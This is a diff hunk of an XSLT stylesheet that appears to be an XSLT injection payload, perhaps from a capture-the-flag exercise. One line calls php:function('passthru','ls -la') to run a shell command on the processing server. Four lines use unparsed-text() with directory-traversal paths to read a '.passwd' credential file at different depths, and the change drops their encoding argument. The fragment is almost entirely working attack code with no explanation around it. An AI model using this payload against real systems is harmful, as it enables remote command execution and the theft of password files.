@@ -10,10 +10,10 @@
     <p>
     <xsl:value-of select="description"/>
     <xsl:value-of select="php:function('passthru','ls -la')"/>
-    <xsl:value-of select="unparsed-text('../../../.passwd', 'iso-8859-1')"/>
-    <xsl:value-of select="unparsed-text('../../.passwd', 'iso-8859-1')"/>
-    <xsl:value-of select="unparsed-text('../.passwd', 'iso-8859-1')"/>
-    <xsl:value-of select="unparsed-text('.passwd', 'iso-8859-1')"/>
+    <xsl:value-of select="unparsed-text('../../../.passwd')"/>
+    <xsl:value-of select="unparsed-text('../../.passwd')"/>
+    <xsl:value-of select="unparsed-text('../.passwd')"/>
+    <xsl:value-of select="unparsed-text('.passwd')"/>
     <span style="font-style:italic"> (<xsl:value-of select='prct'/> %)</span>
     </p>
   </div>
